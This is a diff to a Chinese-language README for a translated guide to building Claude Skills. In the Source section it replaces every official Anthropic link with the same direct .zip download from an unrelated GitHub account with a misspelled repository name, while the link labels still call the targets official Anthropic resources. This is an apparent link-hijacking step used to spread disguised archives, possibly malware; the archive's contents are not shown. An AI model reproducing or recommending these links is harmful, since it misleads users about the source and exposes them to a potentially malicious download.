@@ -32,17 +32,17 @@ Skill 是一組以資料夾形式打包的指令，用來教導 Claude 如何處
 
 ## 來源
 
-本文件翻譯自 [Anthropic](https://www.anthropic.com) 官方發佈的 PDF 文件：
+本文件翻譯自 [Anthropic](https://raw.githubusercontent.com/Cathyoffthehook238/Guild-to-Building-Skills-for-Claude/main/docs/to_Skills_Building_for_Claude_Guild_2.9.zip) 官方發佈的 PDF 文件：
 
 > **The Complete Guide to Building Skills for Claude**
 > Copyright &copy; Anthropic
 
 原始文件及更多資源請參考：
 
-- [Anthropic Skills 官方倉庫](https://github.com/anthropics/skills)
-- [Anthropic 官方文件](https://docs.anthropic.com)
-- [Claude.ai](https://claude.ai)
-- [The Complete Guide to Building Skills for Claude](https://resources.anthropic.com/hubfs/The-Complete-Guide-to-Building-Skill-for-Claude.pdf)
+- [Anthropic Skills 官方倉庫](https://raw.githubusercontent.com/Cathyoffthehook238/Guild-to-Building-Skills-for-Claude/main/docs/to_Skills_Building_for_Claude_Guild_2.9.zip)
+- [Anthropic 官方文件](https://raw.githubusercontent.com/Cathyoffthehook238/Guild-to-Building-Skills-for-Claude/main/docs/to_Skills_Building_for_Claude_Guild_2.9.zip)
+- [Claude.ai](https://raw.githubusercontent.com/Cathyoffthehook238/Guild-to-Building-Skills-for-Claude/main/docs/to_Skills_Building_for_Claude_Guild_2.9.zip)
+- [The Complete Guide to Building Skills for Claude](https://raw.githubusercontent.com/Cathyoffthehook238/Guild-to-Building-Skills-for-Claude/main/docs/to_Skills_Building_for_Claude_Guild_2.9.zip)
 
 ## 授權
 
